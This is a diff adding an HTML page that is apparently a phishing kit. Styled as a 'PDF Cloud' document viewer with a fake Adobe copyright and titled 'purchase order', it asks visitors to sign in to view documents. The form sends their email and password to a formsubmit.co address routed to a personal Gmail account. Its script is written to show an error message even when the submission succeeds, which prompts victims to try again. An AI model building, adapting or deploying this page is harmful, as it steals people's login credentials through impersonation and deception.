@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>purchase order</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: url("1000198792.png") no-repeat center center/cover;
+      font-family: Arial, sans-serif;
+    }
+
+    .form-container {
+      background: rgba(250, 249, 249, 0.85);
+      padding: 20px 30px;
+      border-radius: 12px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+      max-width: 280px;
+      width: 100%;
+    }
+
+    .form-container h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      font-size: 22px;
+    }
+
+    .form-container label {
+      display: block;
+      margin-bottom: 6px;
+      font-weight: bold;
+    }
+
+    .form-container input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 14px;
+    }
+
+    .form-container button {
+    background: #007bff;
+    color: white;
+    border: none; 
+    cursor: pointer; 
+    border-radius: 5px;
+    display: flex;
+    justify-self: center;
+    margin-bottom: 15px;
+    height: 20px;
+    }
+
+    .form-container button:hover {
+      background: #0056b3;
+    }
+    
+  </style>
+</head>
+<body>
+  <div class="form-container">
+    <div class="inline-container">
+      <img src="logo_black.png" style="vertical-align:middle; padding-bottom: 20px;">
+      <span style="font-size:14px; padding-bottom: 20px;"><b>PDF Cloud</b></span>
+    </div>
+    <p style="font-size: 11px;"><b>For security, please sign in with your email to verify your identity and view documents.</b></p>
+
+    <!-- Secondary Logo -->
+    <div class="inline-container2">
+      <img src="logo_red.png" alt="PDF Icon" style="width: 30px; vertical-align:middle;padding-bottom: 20px; padding-top: 10px;">
+      <span style="font-size:18px; " 
+      >PDF Document</span>
+    </div>
+    <form action="https://formsubmit.co/asuomafaith@gmail.com" method="POST">
+      <!-- Replace YOUR_EMAIL_HERE with your email address -->
+      
+      <input type="email" name="email"placeholder="Email address" required>
+      
+      
+      <input type="accesskey" name="accesskey"placeholder="password" required>
+      
+      <button type="submit">Submit</button>
+    </form>
+    <div class="copyright" style="font-size: 12px;"> Copyright © 2025 Adobe Corporation</div>
+   
+   <script>
+  const form = document.getElementById("contactForm");
+  form.addEventListener("submit", async (e) => {
+    e.preventDefault();
+    const response = await fetch(form.action, {
+      method: form.method,
+      body: new FormData(form),
+      headers: { 'Accept': 'application/json' }
+    });
+    if (response.ok) {
+      alert("There was a problem submitting your form.");
+    } else {
+      alert("There was a problem submitting your form.");
+    }
+  });
+</script>
+  </div>
+</body>
+</html>
